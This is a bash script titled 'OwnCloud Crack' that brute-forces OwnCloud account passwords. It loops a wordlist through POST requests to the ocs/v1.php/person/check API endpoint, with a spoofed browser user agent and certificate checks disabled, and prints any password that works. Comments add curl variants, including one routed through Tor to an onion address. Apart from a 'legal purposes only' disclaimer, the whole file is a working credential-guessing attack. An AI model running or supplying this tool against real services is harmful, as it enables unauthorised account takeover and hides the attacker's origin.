#!/bin/bash
# OwnCloud Crack
# Copyright (C) 2016 51x
#
# Description: brute force OwnCloud accounts. For legal purposes only (eg. approved penetration testing).

function help {
  echo '''   OwnCloud Crack help
   Syntax: ./ocrk.sh <site url> <username> <passwordlist>
   Example: ./orck.sh https://www.crkoc.com/ admin rockyou.txt
  '''
}

while getopts ":h" opt;
  do
    case $opt in
      h) help 
      exit 1 ;;
    esac
  done


USER_AGENT="Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0"

if [ -z "$1" ] | [ -z "$2" ] | [ -z "$3" ]
  then
    help
    exit 1 
fi

URL=$1"ocs/v1.php/person/check"
echo "Brute force url: "$URL
USER=$2
echo "Username specified: "$USER
PWL=$3
echo "Passwordlist specified: "$PWL
echo


# Some ideas
# curl --socks4a 127.0.0.1:9050 https://address.onion/ocs/v1.php/person/check -d 'login=admin&password=pass' --insecure
# curl https://randomdomain.com/ocs/v1.php/person/check -d 'login=admin&password=pass'
# wget -qO- $URL --post-data="login=$USER&password=$PW" | grep "<status>ok</status>" ; print $PW


echo "Starting brute force..."
while read PWCURR ;
    do
      echo "Trying:" $PWCURR
      if [[ $(wget -qO- $URL -U "$USER_AGENT" --post-data="login=$USER&password=$PWCURR" --no-check-certificate | grep "<status>ok</status>") ]];
          then
            echo -e "\nPassword found! " $USER" : "$PWCURR "\n" 
            exit 1
      fi
    done < $PWL


